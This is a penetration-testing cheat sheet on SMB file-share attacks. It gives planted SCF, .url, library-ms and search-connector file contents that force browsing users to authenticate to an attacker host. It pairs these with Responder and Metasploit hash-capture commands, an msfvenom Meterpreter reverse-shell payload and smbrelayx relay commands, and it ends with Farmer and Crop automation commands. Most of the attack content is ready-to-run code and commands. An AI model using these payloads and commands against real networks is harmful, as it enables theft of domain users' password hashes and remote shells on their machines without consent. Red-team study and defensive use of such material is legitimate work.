# SCF File Attacks

SMB is a protocol which is widely used across organisations for file sharing purposes. It is not uncommon during internal penetration tests to discover a file share which contains sensitive information such as plain-text passwords and database connection strings. However even if a file share doesn’t contain any data that could be used to connect to other systems but it is configured with write permissions for unauthenticated users then it is possible to obtain passwords hashes of domain users or Meterpreter shells.

## Gathering Hashes

It is not new that SCF \(Shell Command Files\) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share.

### SCF Files

Drop the following `@something.scf` file inside a share and start listening with Responder : `responder -wrf --lm -v -I eth0`

```text
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

Saving the  file as SCF file will make the file to be executed when the user will browse the file. Adding the @ symbol in front of the filename will place the file.scf on the top of the share drive.

### **URL Files**

This attack also works with `.url` files and `responder -I eth0 -v`.

```text
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\10.10.10.10\%USERNAME%.icon
IconIndex=1
```

### **Windows Library Files**

Windows Library Files \(.library-ms\)

```text
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="<http://schemas.microsoft.com/windows/2009/library>">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>\\\\workstation@8888\\folder</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

### **Windows Search Connectors Files**

Windows Search Connectors \(.searchConnector-ms\)

```text
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="<http://schemas.microsoft.com/windows/2009/searchConnector>">
    <iconReference>imageres.dll,-1002</iconReference>
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <iconReference>\\\\workstation@8888\\folder.ico</iconReference>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>\\\\workstation@8888\\folder</url>
    </simpleLocation>
</searchConnectorDescription>
```

Responder needs to be executed with the following parameters to capture the hashes of the users that will browse the share.

```text
responder -wrf --lm -v -I vboxnet0
```

![](../../../../.gitbook/assets/image%20%28257%29.png)

When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file. Windows will try to authenticate to that share with the username and the password of the user. During that authentication process a random 8 byte challenge key is sent from the server to the client and the hashed NTLM/LANMAN password is encrypted again with this challenge key. Responder will capture the NTLMv2 hash.

![](../../../../.gitbook/assets/image%20%28251%29.png)

Alternatively to Responder, Metasploit Framework has a module which can be used to capture challenge-response password hashes from SMB clients.

```text
auxiliary/server/capture/smb
```

![](../../../../.gitbook/assets/image%20%28249%29.png)

As previously when the user will browse the same share his password hash will be captured by Metasploit.

![](../../../../.gitbook/assets/image%20%28252%29.png)

If the password policy inside the company is sufficient it will take possibly days or weeks for the attacker to crack the captured hash.

## Meterpreter Shells

The main advantage of the technique above it that it doesn’t require any user interaction and automatically enforces the user to connect to a share the doesn’t exist negotiating his NTLMv2 hash. Therefore it is also possible to combine this technique with SMB relay that will serve a payload in order to retrieve a Meterpreter shell from every user that will access the share.

MSFVenom can be used to generate the payload that it will executed on the target:

```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.171 LPORT=5555 -f exe > pentestlab.exe
```

Coresecurity has released a set of python scripts called [Impacket](https://github.com/CoreSecurity/impacket) that can perform various attacks against Windows protocols such as SMB. Using the **smbrelayx** python script it is possible to set up and SMB server that will serve a payload when the target host will try to connect. This will performed automatically since the SCF file will enforce every to user to connect to a non-existing share with their credentials.

```text
./smbrelayx.py -h Target-IP -e ./pentestlab.exe
```

![](../../../../.gitbook/assets/image%20%28255%29.png)

Metasploit Framework needs to be used as well in order to receive back the connection upon execution of the pentestlab.exe on the target.

![](../../../../.gitbook/assets/image%20%28247%29.png)

When the user will browse the share the SMB server will receive the connection and it will use the username and the password hash to authenticate with his system and execute the payload to a writable share.

![](../../../../.gitbook/assets/image%20%28253%29.png)

A Meterpreter session will received. However in order to avoid losing the connection it is necessary to migrate to a more stable process.

## Automation

Theses attacks can be automated with [Farmer.exe](https://github.com/mdsecactivebreach/Farmer) and [Crop.exe](https://github.com/mdsecactivebreach/Farmer/tree/main/crop)

```text
# Farmer to receive auth
farmer.exe <port> [seconds] [output]
farmer.exe 8888 0 c:\windows\temp\test.tmp # undefinitely
farmer.exe 8888 60 # one minute

# Crop can be used to create various file types that will trigger SMB/WebDAV connections for poisoning file shares during hash collection attacks
crop.exe <output folder> <output filename> <WebDAV server> <LNK value> [options]
Crop.exe \\\\fileserver\\common mdsec.url \\\\workstation@8888\\mdsec.ico
Crop.exe \\\\fileserver\\common mdsec.library-ms \\\\workstation@8888\\mdsec
```







